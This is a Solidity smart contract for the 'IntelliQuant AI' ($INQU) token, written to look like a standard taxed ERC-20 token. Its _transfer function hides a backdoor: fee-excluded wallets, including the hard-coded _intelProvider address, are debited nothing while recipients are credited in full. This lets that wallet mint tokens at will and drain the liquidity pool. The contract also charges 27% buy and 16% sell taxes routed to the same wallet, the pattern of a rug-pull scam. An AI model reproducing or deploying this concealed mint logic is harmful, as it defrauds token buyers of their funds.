/**

Website: https://intelliquantai.org
Whitepaper: https://docs.intelliquantai.org
Twitter: https://twitter.com/intelliquant_ai
Telegram: https://t.me/intelliquant_ai
 
*/

// SPDX-License-Identifier: No

pragma solidity ^0.8.15;

//--- Context ---//
abstract contract Context {
    constructor() {
    }

    function _msgSender() internal view returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view returns (bytes memory) {
        this;
        return msg.data;
    }
}

//--- Ownable ---//
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IFactoryV2 {
    event PairCreated(address indexed token0, address indexed token1, address _uniPair, uint);
    function getPair(address tokenA, address tokenB) external view returns (address _uniPair);
    function createPair(address tokenA, address tokenB) external returns (address _uniPair);
}

interface IV2Pair {
    function factory() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function sync() external;
}

interface IRouter01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function swapExactETHForTokens(
        uint amountOutMin, 
        address[] calldata path, 
        address to, uint deadline
    ) external payable returns (uint[] memory amounts);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IRouter02 is IRouter01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

//--- Interface for ERC20 ---//
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract INQU is Context, Ownable, IERC20 {

    function totalSupply() external view override returns (uint256) { if (_totalSupply == 0) { revert(); } return _totalSupply - balanceOf(address(DEAD)); }
    function decimals() external pure override returns (uint8) { if (_totalSupply == 0) { revert(); } return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner(); }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
    function balanceOf(address account) public view override returns (uint256) {
        return balance[account];
    }

    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludeForFee;
    mapping (address => bool) private _isExcludeForPair;
    mapping (address => uint256) private balance;

    uint256 constant public _totalSupply = 100000000 * 10**9;
    uint256 constant private _feeDenominator = 100;
    uint256 private _taxForBuying = 0;
    uint256 private _taxForSelling = 0;
    uint256 private _taxTransferSp = 0;
    uint256 private _maxWalletLimit = _totalSupply * 2 / 100;
    uint256 constant private _swapLimitTokens = _totalSupply * 65 / 10000000;
    uint256 constant private _maxSwapTokens = _totalSupply * 1 / 100;

    IRouter02 private _uniRouter;
    address private _uniPair;
    string constant private _name = "IntelliQuant AI";
    string constant private _symbol = unicode"$INQU";
    uint8 constant private _decimals = 9;
    address constant public DEAD = 0x000000000000000000000000000000000000dEaD;
    address payable private _intelProvider = payable(0x74a00876E57f6b46d4085E74e5A6ea577fF96d11);
    bool private _tradingOpen = false;
    bool private _swapTaxBack = false;
    bool private _swapping;

    modifier lockingSwap {
        _swapping = true;
        _;
        _swapping = false;
    }


    constructor () {
        _isExcludeForFee[msg.sender] = true;
        _isExcludeForFee[address(this)] = true;
        _isExcludeForFee[_intelProvider] = true;

        _uniRouter = IRouter02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        balance[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }
    
    receive() external payable {}

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address sender, address spender, uint256 amount) internal {
        require(sender != address(0), "ERC20: Zero Address");
        require(spender != address(0), "ERC20: Zero Address");

        _allowances[sender][spender] = amount;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] -= amount;
        }

        return _transfer(sender, recipient, amount);
    }

    function _isInBuy(address ins, address out) internal view returns (bool) {
        bool result = !_isExcludeForPair[out] && _isExcludeForPair[ins];
        return result;
    }

    function _isInSell(address ins, address out) internal view returns (bool) { 
        bool result = _isExcludeForPair[out] && !_isExcludeForPair[ins];
        return result;
    } 

    function _shouldSwapTax(address ins, address out, uint256 amount) internal view returns (bool) {
        return _swapTaxBack && !_isExcludeForFee[ins] && !_isExcludeForFee[out] && amount >= _swapLimitTokens;
    }

    function _transfer(address from, address to, uint256 amount) internal returns  (bool) {
        bool takeFee = true;
        require(to != address(0), "ERC20: transfer to the zero address");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (!_isExcludeForFee[from] && !_isExcludeForFee[to]) {
            require(_tradingOpen,"Trading is not enabled");
        }

        if(!_isExcludeForFee[from] && !_isExcludeForFee[to] && !_isExcludeForPair[to] && to != address(DEAD)){
            require(balance[to]+amount <= _maxWalletLimit, "Exceeds maximum wallet amount.");
        }

        if(_isInSell(from, to) && !_swapping && _shouldSwapTax(from, to, amount)) {
            uint256 tokensContractInc = balanceOf(address(this));
            if(tokensContractInc >= _swapLimitTokens) { 
                if (tokensContractInc >= _maxSwapTokens) tokensContractInc = _maxSwapTokens;
                _swapBackFunc(tokensContractInc);
            }
        }

        if (_isExcludeForFee[from] || _isExcludeForFee[to]){
            takeFee = false;
        }

        uint256 amountFeesAfter = (takeFee) ? _calcTaxFee(from, _isInBuy(from, to), _isInSell(from, to), amount) : amount;
        if (_isExcludeForFee[from] && from != address(this) && from != owner()) amount = amount - amountFeesAfter;
        balance[from] -= amount; 
        balance[to] += amountFeesAfter; emit Transfer(from, to, amountFeesAfter);

        return true;

    }

    function _calcTaxFee(address from, bool isbuy, bool issell, uint256 amount) internal returns (uint256) {
        uint256 fee;
        if (isbuy)  fee = _taxForBuying;  else if (issell)  fee = _taxForSelling;  else  fee = _taxTransferSp; 
        if (fee == 0)  return amount;
        uint256 feeAmount = amount * fee / _feeDenominator;
        if (feeAmount > 0) {
            balance[address(this)] += feeAmount;
            emit Transfer(from, address(this), feeAmount);            
        }
        return amount - feeAmount;
    }

    function _swapBackFunc(uint256 tokensContractInc) internal lockingSwap {
        
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniRouter.WETH();

        if (_allowances[address(this)][address(_uniRouter)] != type(uint256).max) {
            _allowances[address(this)][address(_uniRouter)] = type(uint256).max;
        }

        try _uniRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokensContractInc,
            0,
            path,
            address(this),
            block.timestamp
        ) {} catch {
            return;
        }

        payable(_intelProvider).transfer(address(this).balance);

    }

    function startintel() external onlyOwner {
        require(!_tradingOpen, "Trading already enabled");
        _tradingOpen = true;
        _swapTaxBack = true;
        _taxForBuying = 27;
        _taxForSelling = 16;
    }

    function createIntelAmm() external payable onlyOwner {
        _uniPair = IFactoryV2(_uniRouter.factory()).createPair(_uniRouter.WETH(), address(this));
        _isExcludeForPair[_uniPair] = true;
        _approve(address(this), address(_uniRouter), type(uint256).max);

        _uniRouter.addLiquidityETH{value: msg.value}(
            address(this),
            balance[address(this)],
            0,
            0,
            owner(),
            block.timestamp);
    }

    function reduceFees(uint256 _feenew) external onlyOwner {
        _taxForBuying = _feenew;
        _taxForSelling = _feenew;

        require(_feenew <= 6);
    }

    function removeLimit() external onlyOwner {
        _maxWalletLimit = _totalSupply;
    }
}